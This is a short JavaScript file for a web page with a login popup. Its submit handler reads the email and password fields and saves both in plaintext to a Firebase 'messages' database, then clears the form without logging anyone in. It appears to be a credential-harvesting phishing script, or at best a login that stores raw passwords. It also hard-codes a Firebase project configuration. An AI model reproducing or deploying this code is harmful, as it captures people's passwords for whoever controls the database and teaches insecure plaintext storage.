//login form
let loginForm = document.querySelector('.login-form-container');
document.querySelector('#login-btn').onclick=()=>{
    loginForm.classList.toggle('active');
}
document.querySelector('#close-login-btn').onclick=()=>{
    loginForm.classList.remove('active');
}


const firebaseConfig = {
  apiKey: "AIzaSyCngmlr_8LOg5uSsFQ5JjyqIPLB49eQZHs",
  authDomain: "database-f8238.firebaseapp.com",
  databaseURL: "https://database-f8238-default-rtdb.firebaseio.com",
  projectId: "database-f8238",
  storageBucket: "database-f8238.appspot.com",
  messagingSenderId: "864795363220",
  appId: "1:864795363220:web:c415e5825789e2e16bb181",
  
};


firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
   var email = getInputVal('email');
   var pwd = getInputVal('pwd');

  // Save message
  saveMessage( email,pwd);

  // Hide alert after 3 seconds
  

  // Clear form
  document.getElementById('contactForm').reset();
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage( email, pwd){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    email:email,
    pwd:pwd
  });
}
